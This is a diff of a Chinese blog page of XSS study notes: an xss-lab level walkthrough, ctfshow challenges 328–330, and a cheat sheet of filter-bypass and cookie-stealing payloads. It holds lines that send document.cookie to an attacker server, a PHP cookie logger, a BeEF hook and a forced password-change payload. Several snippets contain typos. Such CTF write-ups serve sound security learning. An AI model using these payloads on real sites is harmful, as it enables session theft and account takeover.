@@ -197,7 +197,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.2k 字
+      2.5k 字
     </span>
   
 
@@ -207,7 +207,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      14
+      32
        分钟
     </span>
   
@@ -240,19 +240,19 @@
             <h1 style="display: none">XSS笔记</h1>
             
             <div class="markdown-body">
-              <h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>更改test为2 成功显示2</p>
+              <h2 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss-lab"></a>xss-lab</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>更改test为2 成功显示2</p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721161249161.png" srcset="/img/loading.gif" lazyload></p>
 <p>输入<code>&lt;script&gt;&lt;/script&gt;</code>没有显示 按理来说应该会出现欢迎用户<code>&lt;script&gt;&lt;/script&gt;</code>才对，但是没有，到哪里去了，他被浏览器解析了，在这个标签中就可以插入你想执行的js代码<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721231844489.png" srcset="/img/loading.gif" lazyload></p>
 <p>需要弹窗才能下一关</p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721231540223.png" srcset="/img/loading.gif" lazyload></p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721160805637.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721232021324.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721232021324.png" srcset="/img/loading.gif" lazyload></p>
 <p>有输入框 直接插入失败 在查看器看一下源码 </p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721161841692.png" srcset="/img/loading.gif" lazyload></p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721232250230.png" srcset="/img/loading.gif" lazyload></p>
 <p>发现上面的文字内容被html实体化编码了，但是下面输入框里还会显示原内容，但是在value值内浏览器无法解析，把value属性闭合，再把<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>”逃逸出去“  ==&gt; 构造<code>&gt;&quot;&lt;script&gt;&lt;/script&gt;//</code>, <code>//</code>是为了注释后面原有的<code>&gt;&quot;</code></p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721161733218.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721162035732.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721162035732.png" srcset="/img/loading.gif" lazyload></p>
 <p>发现连value值里的内容都被实体化编码了，所以，我们需要尝试其他办法来执行js代码，我们可以发现我们传入的值是在input标签中的，而标签都有属性，我们可以给他添加一个属性，利用这个属性来执行js代码,双引号闭合失败就尝试单引号闭合value</p>
 <blockquote>
 <p>‘onmouseover=’javascript:alert(1)</p>
@@ -260,8 +260,8 @@
 </blockquote>
 <p>这里onmouseover是嵌入到input中的一个属性，他的作用是鼠标滑过时执行javascript代码，成功绕过。</p>
 <p>还有onclick，他的作用是点击时执行</p>
-<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>和前一关不同的是使用了双引号进行闭合</p>
-<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724113402660.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>和前一关不同的是使用了双引号进行闭合</p>
+<h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724113402660.png" srcset="/img/loading.gif" lazyload></p>
 <p>script被插进了下划线 说明匹配了&lt;script&gt; 双写 大小写可以尝试 都行不通</p>
 <p>换个标签试一试</p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724113621774.png" srcset="/img/loading.gif" lazyload></p>
@@ -270,24 +270,24 @@
 <p>“&gt;&lt;a href=javascript:alert(1)&gt;click on&lt;/a&gt;</p>
 </blockquote>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724115942750.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>测试发现第五关的基础上对herf进行了匹配 进行大小写绕过</p>
+<h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p>测试发现第五关的基础上对herf进行了匹配 进行大小写绕过</p>
 <blockquote>
 <p>“&gt;&lt;a Href=javascript:alert(1)&gt;click on&lt;/a&gt;</p>
 </blockquote>
-<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>第五关提到的双写这里出现了<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724223917009.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p>第五关提到的双写这里出现了<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724223917009.png" srcset="/img/loading.gif" lazyload></p>
 <p>可以看到提交后标签里的script不再是插入下划线 而是替换为空 那么尝试双写<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724224133906.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724225137053.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724225137053.png" srcset="/img/loading.gif" lazyload></p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724225156651.png" srcset="/img/loading.gif" lazyload></p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724225227736.png" srcset="/img/loading.gif" lazyload></p>
 <p>点击链接后</p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724225301905.png" srcset="/img/loading.gif" lazyload></p>
 <p>原来javascript被过滤了 可以将这个进行编码绕过 比如将最后一个字符进行编码<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724225948421.png" srcset="/img/loading.gif" lazyload></p>
 <p>得到<code>javascrip&amp;#116:alert()</code>放入框里添加链接 然后点击链接即可</p>
-<h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p>无论什么都是链接不合法 看一下wp说需要<code>http://</code> 而且不能因为有<code>http://</code>影响注入</p>
+<h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p>无论什么都是链接不合法 看一下wp说需要<code>http://</code> 而且不能因为有<code>http://</code>影响注入</p>
 <p>那么就注释掉</p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724231259786.png" srcset="/img/loading.gif" lazyload></p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724231254317.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210726224553446.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210726224553446.png" srcset="/img/loading.gif" lazyload></p>
 <p>直接插入不行   查看源码发现有三个input是hidden的  分别传参如下</p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210726224355595.png" srcset="/img/loading.gif" lazyload></p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210726224412941.png" srcset="/img/loading.gif" lazyload></p>
@@ -298,7 +298,7 @@
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210726230555125.png" srcset="/img/loading.gif" lazyload></p>
 <p>鼠标划过文本框</p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210726230610328.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p>仍然使用上一关的方法</p>
+<h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><p>仍然使用上一关的方法</p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728171409093.png" srcset="/img/loading.gif" lazyload></p>
 <p>发现被实例化  这个t_ref参数怎么利用 url里传好像传不进去</p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728173918864.png" srcset="/img/loading.gif" lazyload></p>
@@ -306,11 +306,11 @@
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728174023540.png" srcset="/img/loading.gif" lazyload></p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728174042560.png" srcset="/img/loading.gif" lazyload></p>
 <p>一传进去就是出现文本框了<br><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728174109292.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728174639889.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728174639889.png" srcset="/img/loading.gif" lazyload></p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728174626300.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p>理所当然的<br><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728174839524.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="13"><a href="#13" class="headerlink" title="13"></a>13</h3><p>理所当然的<br><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728174839524.png" srcset="/img/loading.gif" lazyload></p>
 <p>额没有反应 抓包！<br><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728211436470.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210802013507101.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="16"><a href="#16" class="headerlink" title="16"></a>16</h3><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210802013507101.png" srcset="/img/loading.gif" lazyload></p>
 <p>被替换为空格 注意空格和空字符不一样 尝试了大小写无效</p>
 <p>尝试图片标签 </p>
 <blockquote>
@@ -322,8 +322,62 @@
 <p>&lt;img%0asrc=1%0aonerror=alert()&gt;</p>
 </blockquote>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210802014135142.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="xss的攻防："><a href="#xss的攻防：" class="headerlink" title="xss的攻防："></a>xss的攻防：</h2><p>1.利用&lt;&gt;标记，构造<script>标签可执行javascript的xss代码。</p>
-<p>xss过滤函数需过滤&lt;&gt;<script></script>等字符。</p>
+<h2 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h2><p>xss平台代码插入后提示不是管理员，说明我们不能插自己，得插管理员</p>
+<p>payload：</p>
+<blockquote>
+<p>&lt;scrpit&gt;document.location.href=’<a target="_blank" rel="noopener" href="http://vps/getcookie.php?cookie=&#39;+document.cookie\">http://vps/getcookie.php?cookie=&#39;+document.cookie\</a>&lt;/script&gt;</p>
+<p>&lt;body onload=”document.location.href=’<a target="_blank" rel="noopener" href="http://vps/getcookie.php?cookie=&#39;+document.cookie&quot;&gt;\">http://vps/getcookie.php?cookie=&#39;+document.cookie&quot;&gt;\</a>&lt;/body&gt;</p>
+</blockquote>
+<p>getcookie.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$Cookie</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$Cookie</span>))&#123;<br><span class="hljs-variable">$action</span> = fopoen(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;The file create failed!&quot;</span>);<br>fwrite(<span class="hljs-variable">$action</span>,<span class="hljs-variable">$Cookie</span>,<span class="hljs-string">&quot;\n&quot;</span>);<br>fclose(<span class="hljs-variable">$Cookie</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;The Cookie has dump!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Nothing input!&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>ctfshow328</li>
+</ul>
+<p>查看功能点，注册，登录，均不能查看到flag，需要管理员登录</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211021195236357.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们注册一个密码获得cookie</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211021195756121.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211021195828394.png" srcset="/img/loading.gif" lazyload></p>
+<p>在浏览器伪造一下cookie，我们只看到了一闪而过的页面，然后就到了我们脚本的回显，说面是执行成功的，我们抓包看一下</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211021200724719.png" srcset="/img/loading.gif" lazyload></p>
+<p>对比得知，这里还有请求包才对，我们要抓取这个请求包，并且防止它跳转</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211021195949954.png" srcset="/img/loading.gif" lazyload></p>
+<p>询问出题人得知，这里采用了database，js获取ajax，所以说明这里发包后还有一个包没有获得，我们直接在proxy模块一个一个抓</p>
+<p>在发送了管理员cookie后，把第一个包放掉，把js请求ajax请求的包抓取下来</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211021200228393.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211021200412268.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以从控制台的性能(启用高级绘制插桩，设置cpu和网络倍速)里面查看到一闪而过的画面，我们在时间轴可以看到</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211021210045312.png" srcset="/img/loading.gif" lazyload></p>
+<p>此时还有一个请求</p>
+<ul>
+<li>ctfshow 329</li>
+</ul>
+<p>登录后就注销掉当前cookie，从而没有办法用所获得的cookie进行登录，我们直接xss读取源码发送到vps上接受</p>
+<p>先在表中插入一个数据，然后控制台尝试输出他的属性，为后面构造payload做准备</p>
+<p>这里使用了jquery的遍历</p>
+<blockquote>
+<p>&lt;script&gt;$(‘.laytable-cell-1-0-1’).each(function(index,value){if(value.innerHTML.indexOf(‘ctf’+’show{‘)&gt;-1){window.location.href=”<a target="_blank" rel="noopener" href="http://49.233.34.67/app/get.php?cookie=&quot;+value.innerHTML;%7D%7D);%5C">http://49.233.34.67/app/get.php?cookie=&quot;+value.innerHTML;}});\</a>&lt;/script&gt;</p>
+</blockquote>
+<ul>
+<li>ctfshow 330</li>
+</ul>
+<p>有个修改密码的功能，抓包<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211024144417192.png" srcset="/img/loading.gif" lazyload></p>
+<p>很自然的想法就是让管理员发出这个包，然后以123456登录即可</p>
+<p>注册一个密码</p>
+<blockquote>
+<p>&lt;script&gt;window.location.href=’<a target="_blank" rel="noopener" href="http://127.0.0.1/api/change.php?p=123456&#39;;\">http://127.0.0.1/api/change.php?p=123456&#39;;\</a>&lt;/script&gt;</p>
+</blockquote>
+<p>没有用，再看一看题目很贴心的告诉你应该放在用户名里<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211024145254601.png" srcset="/img/loading.gif" lazyload></p>
+<p>用admin-123456成功登录</p>
+<h2 id="xss的攻防："><a href="#xss的攻防：" class="headerlink" title="xss的攻防："></a>xss的攻防：</h2><h3 id="常用HTML标签"><a href="#常用HTML标签" class="headerlink" title="常用HTML标签"></a>常用HTML标签</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">iframe</span>&gt;    <span class="hljs-selector-tag">iframe</span> 元素会创建包含另一个文档的内联框架。<br><br>&lt;<span class="hljs-selector-tag">textarea</span>&gt;   <span class="hljs-selector-tag">textarea</span> 标签定义多行的文本输入控件<br><br>&lt;<span class="hljs-selector-tag">img</span>&gt;        <span class="hljs-selector-tag">img</span>  元素向网页中嵌入图像。<br><br>&lt;script&gt;     script 标签用于定义客户端脚本，比如javascript.<br>             script 元素既可以包含脚本语句，也可以通过 <span class="hljs-attribute">src</span> 属性指向外部脚本文件。<br>             必须的 type 属性规定脚本的 MIME 类型<br>             javascript 的常见应用是图像操作、表单验证以及动态内容更新。<br></code></pre></td></tr></table></figure>
+
+<h3 id="常用javascript方法"><a href="#常用javascript方法" class="headerlink" title="常用javascript方法"></a>常用javascript方法</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">alert        alert() 方法用于显示带有一条指定消息和一个确认按钮的警告框。<br><br>window.<span class="hljs-keyword">location</span>   <span class="hljs-title">用于获得当前页面的地址url</span>，并把浏览器重定向到新的页面。<br><br>location.href     返回当前显示的文档的完整 URL<br><br>onload            一张页面或一幅图像完成加载<br><br>onsubmit           确认按钮被点击<br><br>onerror            在加载文档或图像时发生错误<br></code></pre></td></tr></table></figure>
+
+<h3 id="构造XSS脚本"><a href="#构造XSS脚本" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs xml">弹窗警告<br>此脚本实现弹窗框提示，一般作为漏洞测试或者演示使用，类似SQL注入测试中的单引号，一旦脚本能执行，也就意味着后端服务器没有对特殊字符做过滤 <span class="hljs-tag">&lt;&gt;</span> \ &#x27; ,这样就可以证明，这个页面存在xss漏洞。<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>页面嵌套<br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://www.baidu.com</span> <span class="hljs-attr">width</span>=<span class="hljs-string">300</span> <span class="hljs-attr">height</span>=<span class="hljs-string">300</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://www.baidu.com</span> <span class="hljs-attr">width</span>=<span class="hljs-string">0</span> <span class="hljs-attr">height</span>=<span class="hljs-string">0</span> <span class="hljs-attr">border</span>=<span class="hljs-string">0</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>页面重定向<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">windows.location=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>弹窗警告并重定向<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&quot;hello world!&quot;</span>);location.href=<span class="hljs-string">&quot;http:/www.baidu.com&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>访问恶意代码<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.xxx.com/xx.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>可结合 beef 收集用户cookie<br><br>巧用图片标签<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://BeFF_IP:3000/book.js&quot;</span>&gt;</span><br><br>绕开过滤的脚本<br>大小写 <span class="hljs-tag">&lt;<span class="hljs-name">ScRIpt</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">ScRiPT</span>&gt;</span><br>字符编码  采用URL、Base64 等编码<br>javasc<span class="hljs-symbol">&amp;#x72;</span>ipt:alert(123)<br><br>收集用户cookie<br>打开新窗口并且采用本地cookie访问目标页，<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.open(<span class="hljs-string">&quot;http://www.baidu.com/cookie.php?cookie=&quot;</span>+<span class="hljs-built_in">document</span>.cookie<span class="hljs-string">&quot;)</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.location=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>/cookie.php?cookie=<span class="hljs-string">&quot;+document.cookie&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>/<span class="hljs-attr">cookie.php</span>?<span class="hljs-attr">cookie</span>=<span class="hljs-string">&quot;+document.cookie&gt;&lt;/img&gt;</span></span><br><span class="hljs-string"><span class="hljs-tag">&lt;iframe src=&quot;</span><span class="hljs-attr">http:</span>//<span class="hljs-attr">www.baidu.com</span>&quot;/<span class="hljs-attr">cookie.php</span>?<span class="hljs-attr">cookie</span>=<span class="hljs-string">&quot;+document.cookie&gt;&lt;/iframe&gt;</span></span><br><span class="hljs-string"><span class="hljs-tag">&lt;script&gt;new Image().src=&quot;</span><span class="hljs-attr">http:</span>//<span class="hljs-attr">www.baidu.com</span>&quot;/<span class="hljs-attr">cookie.php</span>?<span class="hljs-attr">cookie</span>=<span class="hljs-string">&quot;+document.cookie;img.width=0;img.height=0;&lt;/script&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.利用&lt;&gt;标记，构造&lt;script&gt;标签可执行javascript的xss代码。</p>
+<p>xss过滤函数需过滤&lt;&gt;&lt;script&gt;&lt;/script&gt;等字符。</p>
 <p>2.利用html标签属性支持javascript:伪协议（支持标签属性的有href、lowsrc、bgsound、background、value、action、dynsrc等），执行xss代码。</p>
 <p>xss 过滤函数需过滤JavaScript等关键字。</p>
 <p>3.利用javascript在引号中只用分号分隔单词或强制语句结束，用换行符忽略分号强制结束一个完整语句，而忽略回车、空格、tab等键，绕过对javascript的关键字的过滤。</p>
